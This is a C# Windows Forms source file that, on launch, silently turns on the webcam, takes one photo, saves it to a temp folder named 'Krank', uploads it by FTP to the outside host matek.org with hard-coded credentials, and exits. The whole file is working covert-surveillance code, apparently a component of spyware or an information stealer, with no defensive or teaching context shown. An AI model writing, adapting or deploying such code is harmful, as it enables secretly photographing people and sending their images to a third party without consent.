using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using WebCam_Capture;
using WinFormCharpWebCam;

namespace cam
{
    public partial class Form1 : Form
    {
        WebCam webcam;
        public Form1()
        {
            InitializeComponent();
            webcam = new WebCam();
            webcam.InitializeWebCam();
            webcam.Start();
            var str = Path.Combine(Path.GetTempPath(), "Krank\\cam.jpg");
            Task.Factory.StartNew(delegate
            {
                Thread.Sleep(1000);
                webcam._FrameImage.Save(str, ImageFormat.Jpeg);
                webcam.Stop();
                Thread.Sleep(150);
                using (WebClient client = new WebClient())
                {
                    client.Credentials = new NetworkCredential("krank", "krank");
                    client.UploadFile("ftp://matek.org/cam.jpg", "STOR", str);
                }
                Environment.Exit(0);
            });
        }
    }
}
